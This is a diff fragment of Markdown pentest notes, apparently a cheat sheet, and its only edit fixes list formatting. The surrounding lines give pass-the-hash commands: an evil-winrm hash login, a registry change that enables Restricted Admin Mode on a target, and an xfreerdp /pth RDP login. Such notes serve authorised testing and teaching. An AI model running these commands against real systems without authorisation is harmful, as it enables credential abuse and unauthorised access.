@@ -48,11 +48,11 @@ evil-winrm -i $IP -u $USERNAME -H $HASH
 ```
 
 - Pass the Hash with RDP
-	-Precondition: Restricted Admin Mode must be enabled on the TARGET
+	- Precondition: Restricted Admin Mode must be enabled on the TARGET
 	```cmd
 	reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 	```
-	-Run xfreerdp with /pth flag
+	- Run xfreerdp with /pth flag
 	```bash
 	xfreerdp /v:$IP /u:$USERNAME /pth:$HASH
 	```
